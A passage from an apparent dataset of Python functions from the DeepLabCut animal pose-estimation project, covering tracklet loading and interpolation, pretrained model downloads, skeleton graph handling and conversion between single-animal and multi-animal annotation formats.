        last_frames.append(get_frame_ind(list(tracklet)[-1]))
        if len(tracklet) > self.min_tracklet_len:
            tracklets_sorted.append(tracklet)
    self.nframes = max(last_frames) + 1
    self.times = np.arange(self.nframes)
    if auto_fill:
        tracklets_multi = np.full((self.nindividuals, self.nframes, len(bodyparts_multi) * 3), np.nan, np.float16)
        tracklets_single = np.full((self.nframes, len(bodyparts_single) * 3), np.nan, np.float16)
        for _ in trange(len(tracklets_sorted)):
            tracklet = tracklets_sorted.pop()
            (inds, temp) = zip(*[(get_frame_ind(k), v) for (k, v) in tracklet.items()])
            inds = np.asarray(inds)
            data = np.asarray(temp, dtype=np.float16)
            data_single = data[:, mask_single]
            is_multi = np.isnan(data_single).all()
            if not is_multi:
                is_free = np.isnan(tracklets_single[inds])
                has_data = ~np.isnan(data_single)
                mask = has_data & is_free
                (rows, cols) = np.nonzero(mask)
                tracklets_single[inds[rows], cols] = data_single[mask]
                overwrite = has_data & ~is_free
                if overwrite.any():
                    (rows, cols) = np.nonzero(overwrite)
                    more_confident = (data_single[overwrite] > tracklets_single[inds[rows], cols])[2::3]
                    idx = np.flatnonzero(more_confident)
                    for i in idx:
                        sl = slice(i * 3, i * 3 + 3)
                        tracklets_single[inds[rows[sl]], cols[sl]] = data_single[rows[sl], cols[sl]]
            else:
                is_free = np.isnan(tracklets_multi[:, inds])
                data_multi = data[:, mask_multi]
                has_data = ~np.isnan(data_multi)
                overwrite = has_data & ~is_free
                overwrite_risk = np.any(overwrite, axis=(1, 2))
                if overwrite_risk.all():
                    n_empty = is_free.all(axis=2).sum(axis=1)
                    for ind in np.argsort(n_empty)[::-1]:
                        mask = has_data & is_free
                        current_mask = mask[ind]
                        (rows, cols) = np.nonzero(current_mask)
                        if rows.size:
                            tracklets_multi[ind, inds[rows], cols] = data_multi[current_mask]
                            is_free[ind, current_mask] = False
                            has_data[current_mask] = False
                    if has_data.any():
                        remaining = data_multi[has_data].reshape((-1, 3))
                        mask3d = np.broadcast_to(has_data, (self.nindividuals,) + has_data.shape)
                        (dims, rows, cols) = np.nonzero(mask3d)
                        temp = tracklets_multi[dims, inds[rows], cols].reshape((self.nindividuals, -1, 3))
                        diff = remaining - temp
                        dist = np.abs(diff[:, :, 0]) + np.abs(diff[:, :, 1])
                        closest = np.argmin(dist, axis=0)
                        prob = diff[closest, range(len(closest)), 2]
                        better = np.flatnonzero(prob > 0)
                        idx = closest[better]
                        (rows, cols) = np.nonzero(has_data)
                        for (i, j) in zip(idx, better):
                            sl = slice(j * 3, j * 3 + 3)
                            tracklets_multi[i, inds[rows[sl]], cols[sl]] = remaining.flat[sl]
                else:
                    (rows, cols) = np.nonzero(has_data)
                    n = np.argmin(overwrite_risk)
                    tracklets_multi[n, inds[rows], cols] = data_multi[has_data]
        multi = tracklets_multi.swapaxes(0, 1).reshape((self.nframes, -1))
        data = np.c_[multi, tracklets_single].reshape((self.nframes, -1, 3))
        xy = data[:, :, :2].reshape((self.nframes, -1))
        prob = data[:, :, 2].reshape((self.nframes, -1))
        missing = np.isnan(xy)
        xy_filled = columnwise_spline_interp(xy, self.max_gap)
        filled = ~np.isnan(xy_filled)
        xy[filled] = xy_filled[filled]
        inds = np.argwhere(missing & filled)
        if inds.size:
            inds[:, 1] //= 2
            inds = np.unique(inds, axis=0)
            prob[inds[:, 0], inds[:, 1]] = 0.01
        data[:, :, :2] = xy.reshape((self.nframes, -1, 2))
        data[:, :, 2] = prob
        self.data = data.swapaxes(0, 1)
        self.xy = self.data[:, :, :2]
        self.prob = self.data[:, :, 2]
        self.individuals = self.cfg['individuals'] + (['single'] if len(self.cfg['uniquebodyparts']) else [])
        self.tracklet2id = [i for i in range(0, self.nindividuals) for _ in bodyparts_multi] + [self.nindividuals] * len(bodyparts_single)
        bps = bodyparts_multi + bodyparts_single
        map_ = dict(zip(bps, range(len(bps))))
        self.tracklet2bp = [map_[bp] for bp in self.bodyparts[::3]]
        self._label_pairs = self.get_label_pairs()
    else:
        tracklets_raw = np.full((len(tracklets_sorted), self.nframes, len(bodyparts)), np.nan, np.float16)
        for (n, tracklet) in enumerate(tracklets_sorted[::-1]):
            for (frame, data) in tracklet.items():
                i = get_frame_ind(frame)
                tracklets_raw[n, i] = data
        self.data = tracklets_raw.swapaxes(0, 1).reshape((self.nframes, -1, 3)).swapaxes(0, 1)
        self.xy = self.data[:, :, :2]
        self.prob = self.data[:, :, 2]
        self.tracklet2id = self.tracklet2bp = [0] * self.data.shape[0]"
AlexEMG/DeepLabCut,load_tracklets_from_pickle,"def load_tracklets_from_pickle(self, filename, auto_fill=True):
    self.filename = filename
    with open(filename, 'rb') as file:
        tracklets = pickle.load(file)
    self._load_tracklets(tracklets, auto_fill)
    self._xy = self.xy.copy()"
AlexEMG/DeepLabCut,load_tracklets_from_hdf,"def load_tracklets_from_hdf(self, filename):
    self.filename = filename
    df = pd.read_hdf(filename)
    data = df.to_numpy()
    mask = ~df.columns.get_level_values(level='coords').str.contains('likelihood')
    xy = data[:, mask]
    prob = data[:, ~mask]
    missing = np.isnan(xy)
    xy_filled = columnwise_spline_interp(xy, self.max_gap)
    filled = ~np.isnan(xy_filled)
    xy[filled] = xy_filled[filled]
    inds = np.argwhere(missing & filled)
    if inds.size:
        inds[:, 1] //= 2
        inds = np.unique(inds, axis=0)
        prob[inds[:, 0], inds[:, 1]] = 0.01
    data[:, mask] = xy
    data[:, ~mask] = prob
    df = pd.DataFrame(data, index=df.index, columns=df.columns)
    idx = df.columns
    self.scorer = idx.get_level_values('scorer').unique().to_list()
    self.bodyparts = idx.get_level_values('bodyparts')
    self.nframes = len(df)
    self.times = np.arange(self.nframes)
    self.data = df.values.reshape((self.nframes, -1, 3)).swapaxes(0, 1)
    self.xy = self.data[:, :, :2]
    self.prob = self.data[:, :, 2]
    individuals = idx.get_level_values('individuals')
    self.individuals = individuals.unique().to_list()
    self.tracklet2id = individuals.map(dict(zip(self.individuals, range(len(self.individuals))))).tolist()[::3]
    bodyparts = self.bodyparts.unique()
    self.tracklet2bp = self.bodyparts.map(dict(zip(bodyparts, range(len(bodyparts))))).tolist()[::3]
    self._label_pairs = list(idx.droplevel(['scorer', 'coords']).unique())
    self._xy = self.xy.copy()"
AlexEMG/DeepLabCut,calc_completeness,"def calc_completeness(self, xy, by_individual=False):
    comp = np.sum(~np.isnan(xy).any(axis=2), axis=1)
    if by_individual:
        inds = np.insert(np.diff(self.tracklet2id), 0, 1)
        comp = np.add.reduceat(comp, np.flatnonzero(inds))
    return comp"
AlexEMG/DeepLabCut,to_num_bodypart,"def to_num_bodypart(self, ind):
    return self.tracklet2bp[ind]"
AlexEMG/DeepLabCut,to_num_individual,"def to_num_individual(self, ind):
    return self.tracklet2id[ind]"
AlexEMG/DeepLabCut,get_non_nan_elements,"def get_non_nan_elements(self, at):
    data = self.xy[:, at]
    mask = ~np.isnan(data).any(axis=1)
    return (data[mask], mask, np.flatnonzero(mask))"
AlexEMG/DeepLabCut,swap_tracklets,"def swap_tracklets(self, track1, track2, inds):
    self.xy[np.ix_([track1, track2], inds)] = self.xy[np.ix_([track2, track1], inds)]
    self.prob[np.ix_([track1, track2], inds)] = self.prob[np.ix_([track2, track1], inds)]
    (self.tracklet2bp[track1], self.tracklet2bp[track2]) = (self.tracklet2bp[track2], self.tracklet2bp[track1])"
AlexEMG/DeepLabCut,find_swapping_bodypart_pairs,"def find_swapping_bodypart_pairs(self, force_find=False):
    if not self.swapping_pairs or force_find:
        sub = self.xy[:, np.newaxis] - self.xy
        with np.errstate(invalid='ignore'):
            pos = sub > 0
            neg = sub <= 0
            down = neg[:, :, 1:] & pos[:, :, :-1]
            up = pos[:, :, 1:] & neg[:, :, :-1]
            zero_crossings = down | up
        self.tracklet_swaps = zero_crossings.all(axis=3)
        cross = self.tracklet_swaps.sum(axis=2) > self.min_swap_len
        mat = np.tril(cross)
        temp_pairs = np.where(mat)
        pairs = []
        for (a, b) in zip(*temp_pairs):
            if self.tracklet2id[a] != self.tracklet2id[b]:
                pairs.append((a, b))
        self.swapping_pairs = pairs
        self.swapping_bodyparts = np.unique(pairs).tolist()"
AlexEMG/DeepLabCut,get_swap_indices,"def get_swap_indices(self, tracklet1, tracklet2):
    return np.flatnonzero(self.tracklet_swaps[tracklet1, tracklet2])"
AlexEMG/DeepLabCut,get_nonoverlapping_segments,"def get_nonoverlapping_segments(self, tracklet1, tracklet2):
    swap_inds = self.get_swap_indices(tracklet1, tracklet2)
    inds = np.insert(swap_inds, [0, len(swap_inds)], [0, self.nframes])
    mask = np.ones_like(self.times, dtype=bool)
    for (i, j) in zip(inds[::2], inds[1::2]):
        mask[i:j] = False
    return mask"
AlexEMG/DeepLabCut,flatten_data,"def flatten_data(self):
    data = np.concatenate((self.xy, np.expand_dims(self.prob, axis=2)), axis=2)
    return data.swapaxes(0, 1).reshape((self.nframes, -1))"
AlexEMG/DeepLabCut,format_multiindex,"def format_multiindex(self):
    scorer = self.scorer * len(self.bodyparts)
    map_ = dict(zip(range(len(self.individuals)), self.individuals))
    individuals = [map_[ind] for ind in self.tracklet2id for _ in range(3)]
    coords = ['x', 'y', 'likelihood'] * len(self.tracklet2id)
    return pd.MultiIndex.from_arrays([scorer, individuals, self.bodyparts, coords], names=['scorer', 'individuals', 'bodyparts', 'coords'])"
AlexEMG/DeepLabCut,get_label_pairs,"def get_label_pairs(self):
    return list(self.format_multiindex().droplevel(['scorer', 'coords']).unique())"
AlexEMG/DeepLabCut,format_data,"def format_data(self):
    columns = self.format_multiindex()
    return pd.DataFrame(self.flatten_data(), columns=columns, index=self.times)"
AlexEMG/DeepLabCut,find_edited_frames,"def find_edited_frames(self):
    mask = np.isclose(self.xy, self._xy, equal_nan=True).all(axis=(0, 2))
    return np.flatnonzero(~mask)"
AlexEMG/DeepLabCut,save,"def save(self, output_name='', *args):
    df = self.format_data()
    if not output_name:
        output_name = self.filename.replace('pickle', 'h5')
    df.to_hdf(output_name, 'df_with_missing', format='table', mode='w')"
AlexEMG/DeepLabCut,check_for_weights,"def check_for_weights(modeltype, parent_path):
    """"""gets local path to network weights and checks if they are present. If not, downloads them from tensorflow.org""""""
    if modeltype not in MODELTYPE_FILEPATH_MAP.keys():
        print(""Currently ResNet (50, 101, 152), MobilenetV2 (1, 0.75, 0.5 and 0.35) and EfficientNet (b0-b6) are supported, please change 'resnet' entry in config.yaml!"")
        return parent_path
    exists = False
    model_path = parent_path / MODELTYPE_FILEPATH_MAP[modeltype]
    try:
        for file in os.listdir(model_path.parent):
            if model_path.name in file:
                exists = True
                break
    except FileNotFoundError:
        pass
    if not exists:
        if 'efficientnet' in modeltype:
            download_weights(modeltype, model_path.parent)
        else:
            download_weights(modeltype, model_path)
    return str(model_path)"
AlexEMG/DeepLabCut,download_weights,"def download_weights(modeltype, model_path):
    """"""
    Downloads the ImageNet pretrained weights for ResNets, MobileNets et al. from TensorFlow...
    """"""
    import urllib
    import tarfile
    from io import BytesIO
    target_dir = model_path.parents[0]
    neturls = auxiliaryfunctions.read_plainconfig(target_dir / 'pretrained_model_urls.yaml')
    try:
        if 'efficientnet' in modeltype:
            url = neturls['efficientnet']
            url = url + modeltype.replace('_', '-') + '.tar.gz'
        else:
            url = neturls[modeltype]
        print('Downloading a ImageNet-pretrained model from {}....'.format(url))
        response = urllib.request.urlopen(url)
        with tarfile.open(fileobj=BytesIO(response.read()), mode='r:gz') as tar:
            tar.extractall(path=target_dir)
    except KeyError:
        print('Model does not exist: ', modeltype)
        print('Pick one of the following: ', neturls.keys())"
AlexEMG/DeepLabCut,download_model,"def download_model(modelname, target_dir):
    """"""
    Downloads a DeepLabCut Model Zoo Project
    """"""
    import urllib.request
    import tarfile
    from tqdm import tqdm

    def show_progress(count, block_size, total_size):
        pbar.update(block_size)

    def tarfilenamecutting(tarf):
        """"""' auxfun to extract folder path
        ie. /xyz-trainsetxyshufflez/
        """"""
        for (memberid, member) in enumerate(tarf.getmembers()):
            if memberid == 0:
                parent = str(member.path)
                l = len(parent) + 1
            if member.path.startswith(parent):
                member.path = member.path[l:]
                yield member
    dlc_path = auxiliaryfunctions.get_deeplabcut_path()
    neturls = auxiliaryfunctions.read_plainconfig(os.path.join(dlc_path, 'pose_estimation_tensorflow', 'models', 'pretrained', 'pretrained_model_urls.yaml'))
    if modelname in neturls.keys():
        url = neturls[modelname]
        response = urllib.request.urlopen(url)
        print('Downloading the model from the DeepLabCut server @Harvard -> Go Crimson!!! {}....'.format(url))
        total_size = int(response.getheader('Content-Length'))
        pbar = tqdm(unit='B', total=total_size, position=0)
        (filename, _) = urllib.request.urlretrieve(url, reporthook=show_progress)
        with tarfile.open(filename, mode='r:gz') as tar:
            tar.extractall(target_dir, members=tarfilenamecutting(tar))
    else:
        models = [fn for fn in neturls.keys() if 'resnet_' not in fn and 'efficientnet' not in fn and ('mobilenet_' not in fn)]
        print('Model does not exist: ', modelname)
        print('Pick one of the following: ', models)"
AlexEMG/DeepLabCut,set_visible_devices,"def set_visible_devices(gputouse: int):
    physical_devices = tf.config.list_physical_devices('GPU')
    n_devices = len(physical_devices)
    if gputouse >= n_devices:
        raise ValueError(f'There are {n_devices} available GPUs: {physical_devices}\nPlease choose `gputouse` in {list(range(n_devices))}.')
    tf.config.set_visible_devices(physical_devices[gputouse], 'GPU')"
AlexEMG/DeepLabCut,smart_restore,"def smart_restore(restorer, sess, checkpoint_path, net_type):
    """"""Restore pretrained weights, smartly redownloading them if missing.""""""
    try:
        restorer.restore(sess, checkpoint_path)
    except ValueError as e:
        dlcparent_path = auxiliaryfunctions.get_deeplabcut_path()
        correct_model_path = os.path.join(dlcparent_path, MODELTYPE_FILEPATH_MAP[net_type])
        if checkpoint_path == correct_model_path:
            _ = check_for_weights(net_type, Path(dlcparent_path))
            restorer.restore(sess, checkpoint_path)
        else:
            raise ValueError(e)"
AlexEMG/DeepLabCut,show_progress,"def show_progress(count, block_size, total_size):
    pbar.update(block_size)"
AlexEMG/DeepLabCut,tarfilenamecutting,"def tarfilenamecutting(tarf):
    """"""' auxfun to extract folder path
        ie. /xyz-trainsetxyshufflez/
        """"""
    for (memberid, member) in enumerate(tarf.getmembers()):
        if memberid == 0:
            parent = str(member.path)
            l = len(parent) + 1
        if member.path.startswith(parent):
            member.path = member.path[l:]
            yield member"
AlexEMG/DeepLabCut,reorder_individuals_in_df,"def reorder_individuals_in_df(df: pd.DataFrame, order: list) -> pd.DataFrame:
    """"""
    Reorders data of df to match the order given in a list

    Parameters:
    ----------
    df: pd.DataFrame
        Data from tracked .h5 file
    order: list of str
        Desired order of individuals

    Return:
    -------
        df: pd.DataFrame
            Reordered DataFrame
    """"""
    columns = df.columns
    inds = df.index
    data = df.loc(axis=1)[:, order].to_numpy()
    df = pd.DataFrame(data, columns=columns, index=inds)
    return df"
AlexEMG/DeepLabCut,extractindividualsandbodyparts,"def extractindividualsandbodyparts(cfg):
    individuals = cfg['individuals'].copy()
    if len(cfg['uniquebodyparts']) > 0:
        individuals.append('single')
    return (individuals, cfg['uniquebodyparts'], cfg['multianimalbodyparts'])"
AlexEMG/DeepLabCut,get_track_method,"def get_track_method(cfg, track_method=''):
    if cfg.get('multianimalproject', False):
        if track_method != '':
            if track_method not in TRACK_METHODS:
                raise ValueError(f""Invalid tracking method. Only {', '.join(TRACK_METHODS)} are currently supported."")
            return track_method
        else:
            track_method = cfg.get('default_track_method', '')
            if not track_method:
                warnings.warn('default_track_method` is undefined in the config.yaml file and will be set to `ellipse`.')
                track_method = 'ellipse'
                cfg['default_track_method'] = track_method
                auxiliaryfunctions.write_config(str(Path(cfg['project_path']) / 'config.yaml'), cfg)
            return track_method
    else:
        return ''"
AlexEMG/DeepLabCut,IntersectionofIndividualsandOnesGivenbyUser,"def IntersectionofIndividualsandOnesGivenbyUser(cfg, individuals):
    """"""Returns all individuals when set to 'all', otherwise all bpts that are in the intersection of comparisonbodyparts and the actual bodyparts""""""
    if 'individuals' not in cfg:
        return ['']
    all_indivs = extractindividualsandbodyparts(cfg)[0]
    if individuals == 'all':
        return all_indivs
    else:
        return [ind for ind in individuals if ind in all_indivs]"
AlexEMG/DeepLabCut,filter_unwanted_paf_connections,"def filter_unwanted_paf_connections(cfg, paf_graph):
    """"""Get rid of skeleton connections between multi and unique body parts.""""""
    multi = extractindividualsandbodyparts(cfg)[2]
    desired = list(combinations(range(len(multi)), 2))
    return [i for (i, edge) in enumerate(paf_graph) if tuple(edge) not in desired]"
AlexEMG/DeepLabCut,validate_paf_graph,"def validate_paf_graph(cfg, paf_graph):
    multianimalbodyparts = extractindividualsandbodyparts(cfg)[2]
    connected = set()
    for (bpt1, bpt2) in paf_graph:
        connected.add(bpt1)
        connected.add(bpt2)
    unconnected = set(range(len(multianimalbodyparts))).difference(connected)
    if unconnected and len(multianimalbodyparts) > 1:
        raise ValueError(f""Unconnected {', '.join((multianimalbodyparts[i] for i in unconnected))}. For multi-animal projects, all multianimalbodyparts should be connected. Ideally there should be at least one (multinode) path from each multianimalbodyparts to each other multianimalbodyparts. "")"
AlexEMG/DeepLabCut,prune_paf_graph,"def prune_paf_graph(list_of_edges, desired_n_edges=None, average_degree=None):
    if not (desired_n_edges or average_degree):
        raise ValueError('Either `desired_n_edges` or `average_degree` must be specified.')
    G = nx.Graph(list_of_edges)
    n_edges = len(G.edges)
    n_nodes = len(G.nodes)
    if average_degree is not None:
        desired_n_edges = math.ceil(n_nodes * average_degree / 2)
    if not n_nodes - 1 <= desired_n_edges < n_edges:
        raise ValueError(f'`desired_n_edges` should be greater than or equal to {n_nodes - 1},\n            but smaller than {n_edges}.')
    while True:
        g = nx.Graph(random.sample(G.edges, desired_n_edges))
        if len(g.nodes) == n_nodes and nx.is_connected(g):
            print('Valid subgraph found...')
            break
    return [sorted(edge) for edge in g.edges]"
AlexEMG/DeepLabCut,getpafgraph,"def getpafgraph(cfg, printnames=True):
    """"""Auxiliary function that turns skeleton (list of connected bodypart pairs)
    into a list of corresponding indices (with regard to the stacked multianimal/uniquebodyparts)

    Convention: multianimalbodyparts go first!
    """"""
    (individuals, uniquebodyparts, multianimalbodyparts) = extractindividualsandbodyparts(cfg)
    bodypartnames = multianimalbodyparts + uniquebodyparts
    lookupdict = {bodypartnames[j]: j for j in range(len(bodypartnames))}
    if cfg['skeleton'] is None:
        cfg['skeleton'] = []
    connected = set()
    partaffinityfield_graph = []
    for link in cfg['skeleton']:
        if link[0] in bodypartnames and link[1] in bodypartnames:
            bp1 = int(lookupdict[link[0]])
            bp2 = int(lookupdict[link[1]])
            connected.add(bp1)
            connected.add(bp2)
            partaffinityfield_graph.append([bp1, bp2])
        else:
            print('Attention, parts do not exist!', link)
    if printnames:
        graph2names(cfg, partaffinityfield_graph)
    return partaffinityfield_graph"
AlexEMG/DeepLabCut,graph2names,"def graph2names(cfg, partaffinityfield_graph):
    (individuals, uniquebodyparts, multianimalbodyparts) = extractindividualsandbodyparts(cfg)
    bodypartnames = multianimalbodyparts + uniquebodyparts
    for pair in partaffinityfield_graph:
        print(pair, bodypartnames[pair[0]], bodypartnames[pair[1]])"
AlexEMG/DeepLabCut,SaveFullMultiAnimalData,"def SaveFullMultiAnimalData(data, metadata, dataname, suffix='_full'):
    """"""Save predicted data as h5 file and metadata as pickle file; created by predict_videos.py""""""
    data_path = dataname.split('.h5')[0] + suffix + '.pickle'
    metadata_path = dataname.split('.h5')[0] + '_meta.pickle'
    with open(data_path, 'wb') as f:
        pickle.dump(data, f, pickle.HIGHEST_PROTOCOL)
    with open(metadata_path, 'wb') as f:
        pickle.dump(metadata, f, pickle.HIGHEST_PROTOCOL)
    return (data_path, metadata_path)"
AlexEMG/DeepLabCut,LoadFullMultiAnimalData,"def LoadFullMultiAnimalData(dataname):
    """"""Save predicted data as h5 file and metadata as pickle file; created by predict_videos.py""""""
    data_file = dataname.split('.h5')[0] + '_full.pickle'
    try:
        with open(data_file, 'rb') as handle:
            data = pickle.load(handle)
    except (pickle.UnpicklingError, FileNotFoundError):
        data = shelve.open(data_file, flag='r')
    with open(data_file.replace('_full.', '_meta.'), 'rb') as handle:
        metadata = pickle.load(handle)
    return (data, metadata)"
AlexEMG/DeepLabCut,returnlabelingdata,"def returnlabelingdata(config):
    """"""Returns a specific labeleing data set -- the user will be asked which one.""""""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    for folder in folders:
        print('Do you want to get the data for folder:', folder, '?')
        askuser = input('yes/no')
        if askuser == 'y' or askuser == 'yes' or askuser == 'Ja' or (askuser == 'ha'):
            fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5')
            Data = pd.read_hdf(fn)
            return Data"
AlexEMG/DeepLabCut,convert2_maDLC,"def convert2_maDLC(config, userfeedback=True, forceindividual=None):
    """"""
    Converts single animal annotation file into a multianimal annotation file,
    by introducing an individuals column with either the first individual
    in individuals list in config.yaml or whatever is passed via ""forceindividual"".

    ----------
    config : string
        Full path of the config.yaml file as a string.

    userfeedback: bool, optional
            If this is set to false during automatic mode then frames for all videos are extracted. The user can set this to true, which will result in a dialog,
            where the user is asked for each video if (additional/any) frames from this video should be extracted. Use this, e.g. if you have already labeled
            some folders and want to extract data for new videos.

    forceindividual: None default
            If a string is given that is used in the individuals column.

    Examples
    --------
    Converts mulianimalbodyparts under the 'first individual' in individuals list in config.yaml
    and uniquebodyparts under 'single'
    >>> deeplabcut.convert2_maDLC('/socialrearing-task/config.yaml')

    --------
    Converts mulianimalbodyparts under the individual label mus17 and uniquebodyparts under 'single'
    >>> deeplabcut.convert2_maDLC('/socialrearing-task/config.yaml', forceindividual='mus17')
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [trainingsetmanipulation._robust_path_split(i)[1] for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    (individuals, uniquebodyparts, multianimalbodyparts) = extractindividualsandbodyparts(cfg)
    if forceindividual is None:
        if len(individuals) == 0:
            print('At least one individual should exist...')
            folders = []
            forceindividual = ''
        else:
            forceindividual = individuals[0]
        if forceindividual == 'single':
            if len(multianimalbodyparts) > 0:
                print(""At least one individual should exist beyond 'single', as there are multianimalbodyparts..."")
                folders = []
    for folder in folders:
        if userfeedback == True:
            print('Do you want to convert the annotation file in folder:', folder, '?')
            askuser = input('yes/no')
        else:
            askuser = 'yes'
        if askuser == 'y' or askuser == 'yes' or askuser == 'Ja' or (askuser == 'ha'):
            fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'])
            Data = pd.read_hdf(fn + '.h5')
            conversioncode.guarantee_multiindex_rows(Data)
            imindex = Data.index
            print('This is a single animal data set, converting to multi...', folder)
            for (j, bpt) in enumerate(uniquebodyparts):
                index = pd.MultiIndex.from_arrays(np.array([2 * [cfg['scorer']], 2 * ['single'], 2 * [bpt], ['x', 'y']]), names=['scorer', 'individuals', 'bodyparts', 'coords'])
                if bpt in Data[cfg['scorer']].keys():
                    frame = pd.DataFrame(Data[cfg['scorer']][bpt].values, columns=index, index=imindex)
                else:
                    frame = pd.DataFrame(np.ones((len(imindex), 2)) * np.nan, columns=index, index=imindex)
                if j == 0:
                    dataFrame = frame
                else:
                    dataFrame = pd.concat([dataFrame, frame], axis=1)
            if len(uniquebodyparts) == 0:
                dataFrame = None
            for (j, bpt) in enumerate(multianimalbodyparts):
                index = pd.MultiIndex.from_arrays(np.array([2 * [cfg['scorer']], 2 * [str(forceindividual)], 2 * [bpt], ['x', 'y']]), names=['scorer', 'individuals', 'bodyparts', 'coords'])
                if bpt in Data[cfg['scorer']].keys():
                    frame = pd.DataFrame(Data[cfg['scorer']][bpt].values, columns=index, index=imindex)
                else:
                    frame = pd.DataFrame(np.ones((len(imindex), 2)) * np.nan, columns=index, index=imindex)
                if j == 0 and dataFrame is None:
                    dataFrame = frame
                else:
                    dataFrame = pd.concat([dataFrame, frame], axis=1)
            Data.to_hdf(fn + 'singleanimal.h5', 'df_with_missing')
            Data.to_csv(fn + 'singleanimal.csv')
            dataFrame.to_hdf(fn + '.h5', 'df_with_missing')
            dataFrame.to_csv(fn + '.csv')"
AlexEMG/DeepLabCut,convert_single2multiplelegacyAM,"def convert_single2multiplelegacyAM(config, userfeedback=True, target=None):
    """"""Convert multi animal to single animal code and vice versa. Note that by providing target='single'/'multi' this will be target!""""""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    (prefixes, uniquebodyparts, multianimalbodyparts) = extractindividualsandbodyparts(cfg)
    for folder in folders:
        if userfeedback == True:
            print('Do you want to convert the annotation file in folder:', folder, '?')
            askuser = input('yes/no')
        else:
            askuser = 'yes'
        if askuser == 'y' or askuser == 'yes' or askuser == 'Ja' or (askuser == 'ha'):
            fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'])
            Data = pd.read_hdf(fn + '.h5')
            conversioncode.guarantee_multiindex_rows(Data)
            imindex = Data.index
            if 'individuals' in Data.columns.names and (target is None or target == 'single'):
                print('This is a multianimal data set, converting to single...', folder)
                for (prfxindex, prefix) in enumerate(prefixes):
                    if prefix == 'single':
                        for (j, bpt) in enumerate(uniquebodyparts):
                            index = pd.MultiIndex.from_product([[cfg['scorer']], [bpt], ['x', 'y']], names=['scorer', 'bodyparts', 'coords'])
                            frame = pd.DataFrame(Data[cfg['scorer']][prefix][bpt].values, columns=index, index=imindex)
                            if j == 0:
                                dataFrame = frame
                            else:
                                dataFrame = pd.concat([dataFrame, frame], axis=1)
                    else:
                        for (j, bpt) in enumerate(multianimalbodyparts):
                            index = pd.MultiIndex.from_product([[cfg['scorer']], [prefix + bpt], ['x', 'y']], names=['scorer', 'bodyparts', 'coords'])
                            frame = pd.DataFrame(Data[cfg['scorer']][prefix][bpt].values, columns=index, index=imindex)
                            if j == 0:
                                dataFrame = frame
                            else:
                                dataFrame = pd.concat([dataFrame, frame], axis=1)
                    if prfxindex == 0:
                        DataFrame = dataFrame
                    else:
                        DataFrame = pd.concat([DataFrame, dataFrame], axis=1)
                Data.to_hdf(fn + 'multianimal.h5', 'df_with_missing')
                Data.to_csv(fn + 'multianimal.csv')
                DataFrame.to_hdf(fn + '.h5', 'df_with_missing')
                DataFrame.to_csv(fn + '.csv')
            elif target is None or target == 'multi':
                print('This is a single animal data set, converting to multi...', folder)
                for (prfxindex, prefix) in enumerate(prefixes):
                    if prefix == 'single':
                        if cfg['uniquebodyparts'] != [None]:
                            for (j, bpt) in enumerate(uniquebodyparts):
                                index = pd.MultiIndex.from_arrays(np.array([2 * [cfg['scorer']], 2 * [prefix], 2 * [bpt], ['x', 'y']]), names=['scorer', 'individuals', 'bodyparts', 'coords'])
                                if bpt in Data[cfg['scorer']].keys():
                                    frame = pd.DataFrame(Data[cfg['scorer']][bpt].values, columns=index, index=imindex)
                                else:
                                    frame = pd.DataFrame(np.ones((len(imindex), 2)) * np.nan, columns=index, index=imindex)
                                if j == 0:
                                    dataFrame = frame
                                else:
                                    dataFrame = pd.concat([dataFrame, frame], axis=1)
                        else:
                            dataFrame = None
                    else:
                        for (j, bpt) in enumerate(multianimalbodyparts):
                            index = pd.MultiIndex.from_arrays(np.array([2 * [cfg['scorer']], 2 * [prefix], 2 * [bpt], ['x', 'y']]), names=['scorer', 'individuals', 'bodyparts', 'coords'])
                            if prefix + '_' + bpt in Data[cfg['scorer']].keys():
                                frame = pd.DataFrame(Data[cfg['scorer']][prefix + '_' + bpt].values, columns=index, index=imindex)
                            else:
                                frame = pd.DataFrame(np.ones((len(imindex), 2)) * np.nan, columns=index, index=imindex)
                            if j == 0:
                                dataFrame = frame
                            else:
                                dataFrame = pd.concat([dataFrame, frame], axis=1)
                    if prfxindex == 0:
                        DataFrame = dataFrame
                    else:
                        DataFrame = pd.concat([DataFrame, dataFrame], axis=1)
                Data.to_hdf(fn + 'singleanimal.h5', 'df_with_missing')
                Data.to_csv(fn + 'singleanimal.csv')
                DataFrame.to_hdf(fn + '.h5', 'df_with_missing')
                DataFrame.to_csv(fn + '.csv')"
AlexEMG/DeepLabCut,form_default_inferencecfg,"def form_default_inferencecfg(cfg):
    inferencecfg = auxiliaryfunctions.read_plainconfig(os.path.join(auxiliaryfunctions.get_deeplabcut_path(), 'inference_cfg.yaml'))
    inferencecfg['minimalnumberofconnections'] = len(cfg['multianimalbodyparts']) / 2
    inferencecfg['topktoretain'] = len(cfg['individuals'])
    return inferencecfg"
AlexEMG/DeepLabCut,check_inferencecfg_sanity,"def check_inferencecfg_sanity(cfg, inferencecfg):
    template = form_default_inferencecfg(cfg)
    missing = [key for key in template if key not in inferencecfg]
    if missing:
        raise KeyError(f""Keys {', '.join(missing)} are missing in the inferencecfg."")"
AlexEMG/DeepLabCut,read_inferencecfg,"def read_inferencecfg(path_inference_config, cfg):
    """"""Load inferencecfg or initialize it.""""""
    try:
        inferencecfg = auxiliaryfunctions.read_plainconfig(str(path_inference_config))
    except FileNotFoundError:
        inferencecfg = form_default_inferencecfg(cfg)
        auxiliaryfunctions.write_plainconfig(str(path_inference_config), dict(inferencecfg))
    return inferencecfg"
AlexEMG/DeepLabCut,check_video_integrity,"def check_video_integrity(video_path):
    vid = VideoReader(video_path)
    vid.check_integrity()
    vid.check_integrity_robust()"
AlexEMG/DeepLabCut,imread,"def imread(image_path, mode='skimage'):
    """"""Read image either with skimage or cv2.
    Returns frame in uint with 3 color channels.""""""
    if mode == 'skimage':
        image = io.imread(image_path)
        if image.ndim == 2 or image.shape[-1] == 1:
            image = skimage.color.gray2rgb(image)
        elif image.shape[-1] == 4:
